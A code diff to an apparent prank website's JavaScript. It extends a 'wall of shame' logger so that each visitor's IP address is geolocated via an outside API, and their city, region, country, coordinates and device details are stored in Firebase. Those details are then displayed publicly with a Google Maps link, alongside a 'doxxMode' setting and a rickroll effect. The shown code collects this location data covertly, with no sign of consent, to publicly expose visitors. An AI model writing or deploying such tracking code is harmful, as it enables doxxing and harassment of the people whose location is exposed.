@@ -330,12 +330,31 @@ firebase.initializeApp(firebaseConfig);
   const doxxModeRef=db.ref('doxxMode');
   const shameRef=db.ref('wallOfShame');
 
-  // IP + DEVICE + BROWSER LOGGING FUNCTION
+  // IP + DEVICE + BROWSER + LOCATION + COORDINATES LOGGING
   async function logToShame(username) {
     try {
       const ipResponse = await fetch('https://api.ipify.org?format=json');
       const ipData = await ipResponse.json();
       const userIP = ipData.ip;
+      
+      // Get location from IP with coordinates
+      let city = 'Unknown';
+      let country = 'Unknown';
+      let region = 'Unknown';
+      let latitude = 'Unknown';
+      let longitude = 'Unknown';
+      
+      try {
+        const geoResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
+        const geoData = await geoResponse.json();
+        city = geoData.city || 'Unknown';
+        country = geoData.country_name || 'Unknown';
+        region = geoData.region || 'Unknown';
+        latitude = geoData.latitude || 'Unknown';
+        longitude = geoData.longitude || 'Unknown';
+      } catch(e) {
+        console.log('Geolocation failed, using Unknown');
+      }
       
       // Detect browser
       const ua = navigator.userAgent;
@@ -368,6 +387,11 @@ firebase.initializeApp(firebaseConfig);
       shameRef.push({
         username: username,
         ip: userIP,
+        city: city,
+        region: region,
+        country: country,
+        latitude: latitude,
+        longitude: longitude,
         browser: browser,
         device: deviceType,
         os: os,
@@ -397,6 +421,11 @@ firebase.initializeApp(firebaseConfig);
         div.style.cssText = 'background:rgba(255,0,0,0.2); border:2px solid #f00; padding:20px; margin:15px 0; border-radius:8px; box-shadow: 0 0 15px rgba(255,0,0,0.5);';
         
         const date = new Date(entry.timestamp).toLocaleString();
+        const location = `${entry.city || 'Unknown'}, ${entry.region || 'Unknown'}, ${entry.country || 'Unknown'}`;
+        const coords = `${entry.latitude || 'Unknown'}, ${entry.longitude || 'Unknown'}`;
+        const mapsLink = (entry.latitude !== 'Unknown' && entry.longitude !== 'Unknown') 
+          ? `https://www.google.com/maps?q=${entry.latitude},${entry.longitude}` 
+          : '#';
         
         div.innerHTML = `
           <div style="color:#0f0; font-size:1.5rem; margin-bottom:10px;">
@@ -405,6 +434,13 @@ firebase.initializeApp(firebaseConfig);
           <div style="color:#f00; font-size:2rem; font-weight:bold; margin:15px 0; text-shadow: 0 0 5px #f00;">
             🌐 IP: ${escapeHtml(entry.ip)}
           </div>
+          <div style="color:#ff0; font-size:1.3rem; margin:10px 0; font-weight:bold;">
+            📍 Location: ${escapeHtml(location)}
+          </div>
+          <div style="color:#0ff; font-size:1.4rem; margin:10px 0; font-weight:bold;">
+            🎯 Coordinates: ${escapeHtml(coords)}
+          </div>
+          ${mapsLink !== '#' ? `<div style="margin:10px 0;"><a href="${mapsLink}" target="_blank" style="color:#0f0; text-decoration:underline; font-size:1.1rem;">🗺️ View on Google Maps</a></div>` : ''}
           <div style="color:#ff0; font-size:1.2rem; margin:10px 0;">
             💻 Device: ${escapeHtml(entry.device || 'Unknown')}
           </div>
@@ -710,7 +746,7 @@ firebase.initializeApp(firebaseConfig);
   }
 
   function triggerRickrollEffect(){
-    const audio = new Audio('https://cdn.jumpshare.com/preview/QkZG947X-nS_3I_jiUG3I4BBIzvg5_640OyXE4ZdqV2doNtqsOxxQWmeRG5iP1NpOtFkRNVyaLq8qgw9by4iDxg9pBwAcWct-0PugooUAx4NdzZ9L2DIvnepvy1dlAl1mPnwIjy5-L4SQRamcF6nsG6yjbN-I2pg_cnoHs_AmgI.mp3');
+    const audio = new Audio('https://cdn.jumpshare.com/preview/QkZG947X-nS_3I_jiUG3I4BBIzvg5_640OyXE4ZdqV2doNtqsOxxQWmeRG5iP1NpOtFkRNVyaLq8qgw9by4iDxg9pBwAcWct-0PugooUAx4NdzZ9L2DIvnepvy1dlAl1MS2VryLfkKWL8RPOy2m-1W6yjbN-I2pg_cnoHs_AmgI.mp3');
     audio.volume = 0.8;
     audio.play().catch(e => console.log('Audio play failed:', e));
     
